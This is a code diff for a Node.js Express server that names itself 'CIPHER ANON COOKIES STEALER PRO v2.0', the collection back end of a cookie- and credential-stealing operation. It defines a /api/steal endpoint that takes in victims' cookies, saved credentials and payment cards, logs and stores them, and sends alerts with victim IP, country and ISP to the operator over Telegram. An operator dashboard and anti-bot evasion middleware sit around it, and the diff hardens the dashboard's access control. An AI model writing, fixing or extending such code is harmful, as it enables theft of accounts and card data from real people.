@@ -11,7 +11,7 @@ const crypto = require('crypto');
 const axios = require('axios');
 const session = require('express-session');
 
-// Import Anti-Bot (make sure anti-bot.js exists in the same folder)
+// Import Anti-Bot
 const { antiBot, handleVerify } = require('./anti-bot.js');
 
 const app = express();
@@ -27,9 +27,7 @@ function generateValidKey() {
     return crypto.randomBytes(32).toString('hex');
 }
 
-// Load config: env vars override config.json
 function loadConfig() {
-    // Environment variables take priority
     const envConfig = {
         DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
         DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
@@ -39,44 +37,30 @@ function loadConfig() {
         SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
     };
 
-    // Try to read config.json for persistence
     let fileConfig = {};
     if (fs.existsSync(CONFIG_FILE)) {
         try {
             fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
-            console.log('[+] Loaded config from file');
-        } catch (e) {
-            console.log('[!] Config file corrupt, using env vars');
-        }
+        } catch (e) {}
     }
 
-    // Merge: env vars override file
     const merged = { ...fileConfig, ...envConfig };
-
-    // Validate encryption key
     const key = merged.ENCRYPTION_KEY;
     if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
-        console.log('[!] Invalid encryption key — generating new one');
         merged.ENCRYPTION_KEY = generateValidKey();
     }
 
-    // Save merged config back to file
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
-    } catch (e) {
-        console.log('[!] Config file not writable — using env vars only');
-    }
+    } catch (e) {}
 
     return merged;
 }
 
 const CONFIG = loadConfig();
 
-// Log config (hide sensitive data)
 console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
 console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
-console.log(`[+] Encryption Key: ${CONFIG.ENCRYPTION_KEY.slice(0,8)}...`);
-console.log(`[+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED' : 'DISABLED'}`);
 
 // ============================================================
 // DATA FILES
@@ -91,14 +75,14 @@ const LOG_FILE = path.join(__dirname, 'steal.log');
 // ============================================================
 
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
-const SESSION_MAX_AGE = 30 * 60 * 1000; // 30 minutes
+const SESSION_MAX_AGE = 30 * 60 * 1000;
 
 app.use(session({
     secret: SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
     cookie: {
-        secure: false, // Railway uses HTTPS but this works
+        secure: false,
         maxAge: SESSION_MAX_AGE,
         httpOnly: true,
         sameSite: 'lax'
@@ -149,7 +133,6 @@ function decryptData(encryptedBase64) {
         const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
         return JSON.parse(decrypted.toString());
     } catch (e) {
-        console.log('[!] Decryption failed:', e.message);
         return null;
     }
 }
@@ -164,7 +147,6 @@ function loadData(file) {
         const decrypted = decryptData(fs.readFileSync(file, 'utf8'));
         return decrypted || [];
     } catch (e) {
-        console.log(`[!] Failed to load ${file}:`, e.message);
         return [];
     }
 }
@@ -173,7 +155,7 @@ let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
 
 // ============================================================
-// DEDUP: IP + hostname, 60s window
+// DEDUP
 // ============================================================
 
 const dedupCache = new Map();
@@ -223,22 +205,26 @@ function requireAuth(req, res, next) {
 }
 
 // ============================================================
-// SERVER SETUP
+// MIDDLEWARE — CORS + JSON + Anti-Bot
 // ============================================================
 
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true }));
 
-// ---- ANTI-BOT (with IP whitelist disabled for public access) ----
+// Anti-Bot — apply BEFORE routes
 app.use(antiBot({
     STRENGTH: 'high',
     RATE_LIMIT_MAX: 10,
-    ALLOWED_IPS: [] // Empty = no IP whitelist, everyone gets challenged
+    ALLOWED_IPS: []
 }));
 
 app.post('/__verify', express.json(), handleVerify);
 
-// ---- SECURITY HEADERS ----
+// ============================================================
+// SECURITY HEADERS
+// ============================================================
+
 app.use((req, res, next) => {
     res.setHeader('X-Content-Type-Options', 'nosniff');
     res.setHeader('X-Frame-Options', 'DENY');
@@ -247,107 +233,20 @@ app.use((req, res, next) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
     res.setHeader('Pragma', 'no-cache');
     res.setHeader('Expires', '0');
-
-    if (req.path.endsWith('.html')) {
-        return res.status(404).send('Not Found');
-    }
     next();
 });
 
-// ---- Serve .php files from public folder ----
-app.get('*.php', (req, res, next) => {
-    const filePath = path.join(__dirname, 'public', req.path);
-    if (fs.existsSync(filePath)) {
-        res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        res.sendFile(filePath);
-    } else {
-        const basePath = filePath.replace(/\.php$/, '');
-        if (fs.existsSync(basePath)) {
-            res.setHeader('Content-Type', 'text/html; charset=utf-8');
-            res.sendFile(basePath);
-        } else {
-            next();
-        }
-    }
+// ============================================================
+// HEALTH CHECK
+// ============================================================
+
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
-app.use(express.static('public', {
-    index: false,
-    setHeaders: (res, filePath) => {
-        if (filePath.endsWith('.html')) {
-            return res.status(404).send('Not Found');
-        }
-        if (filePath.endsWith('.php')) {
-            res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        }
-        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-    }
-}));
-
-// ---- Routes ----
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'home.php'));
+app.get('/ping', (req, res) => {
+    res.send('pong');
 });
-
-app.get('/login.php', (req, res) => {
-    if (req.session && req.session.authenticated) {
-        return res.redirect('/dashboard');
-    }
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'login.php'));
-});
-
-app.get('/password-success.php', (req, res) => {
-    if (req.session) {
-        req.session.destroy(() => {
-            res.setHeader('Content-Type', 'text/html; charset=utf-8');
-            res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
-        });
-    } else {
-        res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
-    }
-});
-
-// ---- Login API ----
-app.post('/api/login', (req, res) => {
-    const { username, password } = req.body;
-
-    if (!username || !password) {
-        return res.status(400).json({ status: 'error', message: 'Username and password required' });
-    }
-
-    if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
-        req.session.authenticated = true;
-        req.session.username = username;
-        req.session.lastActivity = Date.now();
-        req.session.save();
-        log(`[+] User logged in: ${username}`);
-        return res.json({ status: 'ok', message: 'Login successful' });
-    }
-
-    log(`[!] Failed login attempt: ${username}`);
-    res.status(401).json({ status: 'error', message: 'Invalid username or password' });
-});
-
-// ---- Logout ----
-app.get('/api/logout', (req, res) => {
-    req.session.destroy((err) => {
-        if (err) log(`[!] Logout error: ${err.message}`);
-        res.clearCookie('connect.sid');
-        log('[+] User logged out, session destroyed');
-        res.redirect('/login.php');
-    });
-});
-
-// ---- Protected Dashboard ----
-app.get('/dashboard', requireAuth, (req, res) => {
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
-});
-
-// ---- Protected API ----
-app.use('/api/*', requireAuth);
 
 // ============================================================
 // GEOLOCATION
@@ -406,7 +305,7 @@ ${flag} *Country:* ${countryName}
 📡 *ISP:* ${isp}
 🕐 *Time:* ${time}
 
-📊 *Dashboard:* ${process.env.DASHBOARD_URL || 'http://localhost:' + PORT}/dashboard`;
+📊 *Dashboard:* ${process.env.DASHBOARD_URL || 'https://' + (req?.headers?.host || 'localhost:' + PORT)}/dashboard`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, {
@@ -426,10 +325,6 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
-// ============================================================
-// GENERATE UNIQUE ID
-// ============================================================
-
 function generateUniqueId(entry) {
     const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
     const ip = entry.ip || 'unknown';
@@ -440,6 +335,37 @@ function generateUniqueId(entry) {
 // ============================================================
 // API ROUTES
 // ============================================================
+
+// ---- LOGIN API ----
+app.post('/api/login', (req, res) => {
+    const { username, password } = req.body;
+
+    if (!username || !password) {
+        return res.status(400).json({ status: 'error', message: 'Username and password required' });
+    }
+
+    if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
+        req.session.authenticated = true;
+        req.session.username = username;
+        req.session.lastActivity = Date.now();
+        req.session.save();
+        log(`[+] User logged in: ${username}`);
+        return res.json({ status: 'ok', message: 'Login successful' });
+    }
+
+    log(`[!] Failed login attempt: ${username}`);
+    res.status(401).json({ status: 'error', message: 'Invalid username or password' });
+});
+
+// ---- LOGOUT ----
+app.get('/api/logout', (req, res) => {
+    req.session.destroy((err) => {
+        if (err) log(`[!] Logout error: ${err.message}`);
+        res.clearCookie('connect.sid');
+        log('[+] User logged out');
+        res.redirect('/login.php');
+    });
+});
 
 // ---- STEAL COOKIES ----
 app.post('/api/steal', async (req, res) => {
@@ -465,7 +391,6 @@ app.post('/api/steal', async (req, res) => {
 
         const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
 
-        // Dedup check
         cleanDedup();
         if (isDuplicate(ip, hostname)) {
             log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
@@ -481,7 +406,8 @@ app.post('/api/steal', async (req, res) => {
         const cardCount = data.cards.length;
 
         log(`[+] ${hostname} — ${count} cookies, ${credCount} creds, ${cardCount} cards | ${ip}`);
-        await sendTelegram(hostname, count, ip, countryInfo, credCount, cardCount);
+        
+        sendTelegram(hostname, count, ip, countryInfo, credCount, cardCount).catch(() => {});
 
         res.json({ status: 'ok', country: countryInfo });
     } catch (e) {
@@ -491,19 +417,19 @@ app.post('/api/steal', async (req, res) => {
 });
 
 // ---- GET ALL DATA ----
-app.get('/api/data', (req, res) => {
+app.get('/api/data', requireAuth, (req, res) => {
     const clean = stolenData.map(({ _dedupKey, ...rest }) => rest);
     res.json(clean);
 });
 
 // ---- GET TRASH DATA ----
-app.get('/api/trash', (req, res) => {
+app.get('/api/trash', requireAuth, (req, res) => {
     const clean = trashData.map(({ _dedupKey, ...rest }) => rest);
     res.json(clean);
 });
 
 // ---- MOVE TO TRASH ----
-app.delete('/api/delete/:uniqueId', (req, res) => {
+app.delete('/api/delete/:uniqueId', requireAuth, (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
         return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
@@ -527,7 +453,7 @@ app.delete('/api/delete/:uniqueId', (req, res) => {
 });
 
 // ---- RESTORE FROM TRASH ----
-app.post('/api/restore/:uniqueId', (req, res) => {
+app.post('/api/restore/:uniqueId', requireAuth, (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
         return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
@@ -551,7 +477,7 @@ app.post('/api/restore/:uniqueId', (req, res) => {
 });
 
 // ---- PERMANENTLY DELETE ----
-app.delete('/api/trash/permanent/:uniqueId', (req, res) => {
+app.delete('/api/trash/permanent/:uniqueId', requireAuth, (req, res) => {
     const uid = req.params.uniqueId;
     if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
         return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
@@ -572,7 +498,7 @@ app.delete('/api/trash/permanent/:uniqueId', (req, res) => {
 });
 
 // ---- EMPTY TRASH ----
-app.delete('/api/trash/empty', (req, res) => {
+app.delete('/api/trash/empty', requireAuth, (req, res) => {
     try {
         const count = trashData.length;
         trashData = [];
@@ -586,7 +512,7 @@ app.delete('/api/trash/empty', (req, res) => {
 });
 
 // ---- CLEAR ALL DATA ----
-app.delete('/api/clear', (req, res) => {
+app.delete('/api/clear', requireAuth, (req, res) => {
     try {
         stolenData = [];
         saveData(DATA_FILE, stolenData);
@@ -598,7 +524,7 @@ app.delete('/api/clear', (req, res) => {
 });
 
 // ---- CHANGE PASSWORD ----
-app.post('/api/change-password', (req, res) => {
+app.post('/api/change-password', requireAuth, (req, res) => {
     const { oldPassword, newPassword } = req.body;
 
     if (!oldPassword || !newPassword) {
@@ -614,12 +540,10 @@ app.post('/api/change-password', (req, res) => {
     }
 
     CONFIG.DASHBOARD_PASSWORD = newPassword;
-    // Save to config.json
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
-    } catch (e) {
-        log(`[!] Failed to save config: ${e.message}`);
-    }
+    } catch (e) {}
+
     log('[+] Password changed successfully');
 
     req.session.destroy((err) => {
@@ -634,7 +558,7 @@ app.post('/api/change-password', (req, res) => {
 });
 
 // ---- GET TELEGRAM CONFIG ----
-app.get('/api/config/telegram', (req, res) => {
+app.get('/api/config/telegram', requireAuth, (req, res) => {
     res.json({
         botToken: CONFIG.TELEGRAM_BOT_TOKEN || '',
         chatId: CONFIG.TELEGRAM_CHAT_ID || '',
@@ -643,7 +567,7 @@ app.get('/api/config/telegram', (req, res) => {
 });
 
 // ---- UPDATE TELEGRAM CONFIG ----
-app.post('/api/config/telegram', (req, res) => {
+app.post('/api/config/telegram', requireAuth, (req, res) => {
     const { botToken, chatId, notifications } = req.body;
 
     if (!botToken || !chatId) {
@@ -657,22 +581,127 @@ app.post('/api/config/telegram', (req, res) => {
     CONFIG.TELEGRAM_CHAT_ID = chatId;
     CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;
 
-    // Save to config.json
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
-    } catch (e) {
-        log(`[!] Failed to save config: ${e.message}`);
-    }
+    } catch (e) {}
 
     log('[+] Telegram config updated');
     res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
 });
 
 // ============================================================
+// FRONTEND ROUTES
+// ============================================================
+
+// ---- Public Routes (No Auth Required) ----
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'home.php'));
+});
+
+app.get('/login.php', (req, res) => {
+    if (req.session && req.session.authenticated) {
+        return res.redirect('/dashboard');
+    }
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.sendFile(path.join(__dirname, 'public', 'login.php'));
+});
+
+app.get('/home.php', (req, res) => {
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.sendFile(path.join(__dirname, 'public', 'home.php'));
+});
+
+// ---- Protected Routes (Auth Required) ----
+app.get('/dashboard', requireAuth, (req, res) => {
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
+});
+
+app.get('/password-success.php', requireAuth, (req, res) => {
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
+});
+
+// ============================================================
+// SERVE .PHP FILES — BLOCK DIRECT ACCESS
+// ============================================================
+
+app.get('*.php', (req, res, next) => {
+    const filePath = path.join(__dirname, 'public', req.path);
+    
+    // Public .php files (no auth required)
+    const publicPhp = ['/login.php', '/home.php'];
+    
+    if (publicPhp.includes(req.path)) {
+        if (fs.existsSync(filePath)) {
+            res.setHeader('Content-Type', 'text/html; charset=utf-8');
+            return res.sendFile(filePath);
+        }
+        return next();
+    }
+    
+    // ALL other .php files require authentication
+    if (!req.session || !req.session.authenticated) {
+        return res.redirect('/login.php');
+    }
+    
+    if (fs.existsSync(filePath)) {
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+        res.sendFile(filePath);
+    } else {
+        const basePath = filePath.replace(/\.php$/, '');
+        if (fs.existsSync(basePath)) {
+            res.setHeader('Content-Type', 'text/html; charset=utf-8');
+            res.sendFile(basePath);
+        } else {
+            next();
+        }
+    }
+});
+
+// ============================================================
+// STATIC FILES FALLBACK
+// ============================================================
+
+app.use((req, res, next) => {
+    const filePath = path.join(__dirname, 'public', req.path);
+    if (fs.existsSync(filePath) && !req.path.startsWith('/api')) {
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        return res.sendFile(filePath);
+    }
+    next();
+});
+
+// ============================================================
+// 404 HANDLER
+// ============================================================
+
+app.use((req, res) => {
+    if (req.path.startsWith('/api')) {
+        res.status(404).json({ status: 'error', message: 'API endpoint not found' });
+    } else {
+        res.status(404).send('Not Found');
+    }
+});
+
+// ============================================================
+// ERROR HANDLER
+// ============================================================
+
+app.use((err, req, res, next) => {
+    console.error('[!] Error:', err.message);
+    if (req.path.startsWith('/api')) {
+        res.status(500).json({ status: 'error', message: err.message || 'Internal Server Error' });
+    } else {
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+// ============================================================
 // START SERVER
 // ============================================================
 
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log('\n' + '='.repeat(55));
     console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
     console.log('='.repeat(55));
@@ -680,6 +709,7 @@ app.listen(PORT, () => {
     console.log(`  [+] Login: http://localhost:${PORT}/login.php`);
     console.log(`  [+] Home: http://localhost:${PORT}/home.php`);
     console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
+    console.log(`  [+] Health: http://localhost:${PORT}/health`);
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
     console.log(`  [+] Session Timeout: 30 minutes`);
@@ -690,18 +720,18 @@ app.listen(PORT, () => {
 });
 
 // ============================================================
-// GRACEFUL SHUTDOWN — Save data on exit
+// GRACEFUL SHUTDOWN
 // ============================================================
 
 process.on('SIGINT', () => {
-    console.log('\n[!] Received SIGINT. Saving data...');
+    console.log('\n[!] Saving data...');
     saveData(DATA_FILE, stolenData);
     saveData(TRASH_FILE, trashData);
     process.exit(0);
 });
 
 process.on('SIGTERM', () => {
-    console.log('\n[!] Received SIGTERM. Saving data...');
+    console.log('\n[!] Saving data...');
     saveData(DATA_FILE, stolenData);
     saveData(TRASH_FILE, trashData);
     process.exit(0);
